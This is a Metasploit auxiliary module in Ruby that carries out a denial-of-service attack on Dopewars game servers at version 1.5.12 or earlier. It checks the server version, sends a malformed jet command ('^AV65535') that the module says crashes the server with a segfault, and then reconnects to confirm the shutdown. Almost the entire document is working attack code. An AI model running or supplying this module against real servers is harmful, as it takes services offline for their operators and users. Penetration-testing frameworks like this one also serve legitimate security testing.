# Dopewars DOS attack.

require 'msf/core'


class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::Tcp
	include Msf::Auxiliary::Dos
	
	def initialize(info = {})
		super(update_info(info,	
			'Name'           => 'Dopewars Denial of Service',
			'Description'    => %q{
				This module sends a specially-crafted jet command to a Dopewars 
				server, causing a SEGFAULT. Affects versions <= 1.5.12.
			},
			'Author'         => [ 'dougsko' ],
			'License'        => GPL_LICENSE,
			'Version'        => '0.1.0',
			'References'     =>
				[
					[ 'URL', 'None' ],
					[ 'BID', 'None' ],
					[ 'CVE', 'None' ],
				]))
			
			register_options([Opt::RPORT(7902),], self.class)
	end

	def run
		connect

        # Check if vulnerable
        print_status("Checking version...")
        hello_pkt = "foo^^Ar1111111\n^^Acfoo\n"
        sock.put(hello_pkt)
        sock.get.match(/\^Ak(\d+\.\d+\.\d+)/)
        version = $1.gsub(/\./,'').to_i
        if version > 1512
            print_status("This system appears to be patched")
            return Exploit::CheckCode::Safe
        end

        # Send evil jet command
		dos_pkt =  "^AV65535\n"
	
		print_status("Sending dos packet...")
		
		sock.put(dos_pkt)
		
		disconnect

        # Make sure it worked
        print_status("Checking for success...")
        begin
            print_status("Trying to reconnect to server")
            connect
        rescue ::Interrupt
            raise $!
        rescue ::Rex::ConnectionRefused
            print_status("Dopewars server succesfully shut down!")
        end
	end

end
